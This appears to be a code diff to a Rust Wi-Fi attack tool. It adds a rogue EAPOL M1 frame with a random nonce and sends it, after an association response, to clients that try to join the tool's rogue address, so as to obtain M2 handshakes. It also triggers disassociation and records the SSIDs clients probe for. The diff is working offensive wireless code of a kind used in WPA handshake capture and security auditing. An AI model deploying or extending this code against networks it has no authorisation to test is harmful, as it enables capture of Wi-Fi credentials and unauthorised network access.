@@ -28,7 +28,7 @@ use crossterm::terminal::{
 };
 use libc::EXIT_FAILURE;
 use libwifi::frame::components::{MacAddress, RsnAkmSuite, RsnCipherSuite, WpaAkmSuite};
-use libwifi::frame::{DataFrame, NullDataFrame};
+use libwifi::frame::{DataFrame, EapolKey, NullDataFrame};
 use nix::unistd::geteuid;
 
 use nl80211_ng::channels::WiFiChannel;
@@ -39,6 +39,7 @@ use nl80211_ng::{
 
 use radiotap::field::{AntennaSignal, Field};
 use radiotap::Radiotap;
+use rand::{thread_rng, Rng};
 use ratatui::backend::CrosstermBackend;
 use ratatui::layout::Rect;
 use ratatui::widgets::{Row, ScrollbarState, TableState};
@@ -69,7 +70,7 @@ use std::str::FromStr;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use std::thread;
-use std::time::{Duration, Instant};
+use std::time::{Duration, Instant, SystemTime};
 
 use clap::Parser;
 
@@ -357,7 +358,7 @@ pub struct OxideRuntime {
     access_points: WiFiDeviceList<AccessPoint>,
     unassoc_clients: WiFiDeviceList<Station>,
     rogue_client: MacAddress,
-    rogue_ap: MacAddress,
+    rogue_m1: EapolKey,
     handshake_storage: HandshakeStorage,
     frame_count: u64,
     eapol_count: u64,
@@ -468,6 +469,27 @@ impl OxideRuntime {
             ),
         ));
 
+        let mut rng = thread_rng();
+        let key_nonce: [u8; 32] = rng.gen();
+
+        let rogue_m1 = EapolKey {
+            protocol_version: 2u8,
+            timestamp: SystemTime::now(),
+            packet_type: 3u8,
+            packet_length: 0u16,
+            descriptor_type: 2u8,
+            key_information: 138u16,
+            key_length: 16u16,
+            replay_counter: 1u64,
+            key_nonce,
+            key_iv: [0u8; 16],
+            key_rsc: 0u64,
+            key_id: 0u64,
+            key_mic: [0u8; 16],
+            key_data_length: 0u16,
+            key_data: Vec::new(),
+        };
+
         let state = UiState {
             current_menu: MenuType::AccessPoints,
             paused: false,
@@ -504,7 +526,7 @@ impl OxideRuntime {
             access_points,
             unassoc_clients,
             rogue_client,
-            rogue_ap,
+            rogue_m1,
             interface: iface,
             counters: Counters::default(),
             status_log: status::MessageLog::new(),
@@ -619,7 +641,6 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
 
                 let client_mac = probe_request_frame.header.address_2; // MAC address of the client
                 let ap_mac = probe_request_frame.header.address_1; // MAC address of the client
-                let bssid = probe_request_frame.header.address_3; // MAC address of the AP (BSSID)
                 let signal_strength = radiotap
                     .antenna_signal
                     .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);
@@ -636,7 +657,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                                     &Station::new_unassoc_station(
                                         client_mac,
                                         signal_strength,
-                                        vec![],
+                                        vec![ssid.to_string()],
                                     ),
                                 );
                             }
@@ -939,9 +960,10 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                 // Assumption:
                 //  Only a client/potential client will ever submit an association request.
                 //  This is how we will know to send a fake M1 and try to get an M2 from it.
+
                 let client_mac = assoc_request_frame.header.address_2; // MAC address of the client
-                let ap_mac = assoc_request_frame.header.address_1; // MAC address of the AP
-                let bssid = assoc_request_frame.header.address_3; // MAC address of the AP (BSSID)
+                let ap_mac = assoc_request_frame.header.address_1; // MAC address of the AP.
+                let ssid = assoc_request_frame.station_info.ssid;
 
                 // Handle client as not yet associated
                 if client_mac.is_real_device() && client_mac != oxide.rogue_client {
@@ -970,18 +992,24 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                 };
 
                 if ap_mac == oxide.rogue_client {
-                    // We need to send an auth back
+                    // We need to send an association response back
                     let frx = build_association_response(
                         &client_mac,
                         &ap_mac,
                         &ap_mac,
                         oxide.counters.sequence3(),
+                        &ssid.unwrap_or("".to_string()),
                     );
                     write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
                     // Then an M1
-                    let frx =
-                        build_eapol_m1(&client_mac, &ap_mac, &ap_mac, oxide.counters.sequence3());
-                    write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+                    let m1: Vec<u8> = build_eapol_m1(
+                        &client_mac,
+                        &ap_mac,
+                        &ap_mac,
+                        oxide.counters.sequence3(),
+                        &oxide.rogue_m1,
+                    );
+                    write_packet(oxide.tx_socket.as_raw_fd(), &m1)?;
                 }
             }
             Frame::AssociationResponse(assoc_response_frame) => {
@@ -992,12 +1020,6 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                 //
                 let client_mac = assoc_response_frame.header.address_1; // MAC address of the client
                 let bssid = assoc_response_frame.header.address_2; // MAC address of the AP (BSSID)
-
-                // My attempt at sending ack from userspace.
-                /* if client_mac.0[0..3] == oxide.rogue_client.0[0..3] {
-                    let ack = build_ack(&bssid);
-                    write_packet(oxide.tx_socket.as_raw_fd(), &ack);
-                } */
 
                 if bssid.is_real_device()
                     && client_mac.is_real_device()
@@ -1504,7 +1526,9 @@ fn handle_data_frame(
 
         let essid = ap.ssid.clone();
 
-        if station_addr == oxide.rogue_client {
+        if station_addr == oxide.rogue_client
+            && eapol.determine_key_type() == libwifi::frame::MessageType::Message1
+        {
             let frx = build_disassocation_from_client(
                 &ap_addr,
                 &station_addr,
@@ -1527,7 +1551,7 @@ fn handle_data_frame(
                 oxide.status_log.add_message(StatusMessage::new(
                     MessageType::Info,
                     format!(
-                        "New Eapol: {source} => {dest} ({})",
+                        "New Eapol: {dest} => {source} ({})",
                         eapol.determine_key_type()
                     ),
                 ));
@@ -1546,7 +1570,7 @@ fn handle_data_frame(
                 oxide.status_log.add_message(StatusMessage::new(
                     MessageType::Info,
                     format!(
-                        "Eapol Failed to Add: {source} => {dest} ({}) | {e}",
+                        "Eapol Failed to Add: {dest} => {source} ({}) | {e}",
                         eapol.determine_key_type(),
                     ),
                 ));
